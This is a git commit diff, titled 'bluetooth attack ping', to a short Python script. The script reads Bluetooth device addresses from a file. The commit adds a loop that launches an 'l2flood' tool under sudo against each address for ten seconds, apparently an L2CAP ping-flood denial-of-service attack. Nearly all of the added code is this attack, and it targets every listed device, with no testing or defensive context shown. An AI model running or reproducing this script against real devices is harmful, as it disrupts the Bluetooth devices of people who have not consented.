5d0ffb2799ecb20acbee50fe35e7dc6c55502208
davidpozoio <117756174+davidpozoio@users.noreply.github.com>
2024-07-14 22:26:49 -0500

    bluetooth attack ping

--- bluetooth_devices.py
+++ bluetooth_devices.py
@@ -1,4 +1,7 @@
 import re
+import os
+import threading
+import subprocess
 
 pattern = r"Device ([\w+:]+)"
 
@@ -7,4 +10,16 @@ devices = []
 with open("devices", "r") as file:
     devices = re.findall(pattern, file.read())    
 
-print(devices)
+
+def l2flood(device):
+    process = subprocess.Popen(["sudo", "./l2flood/l2flood", f"{device}"])
+    try:
+        print('Running in process', process.pid)
+        process.wait(timeout=10)
+    except subprocess.TimeoutExpired:
+        print('Timed out - killing', process.pid)
+        process.kill()
+    print("Done")
+
+for device in devices:
+    l2flood(device=device)
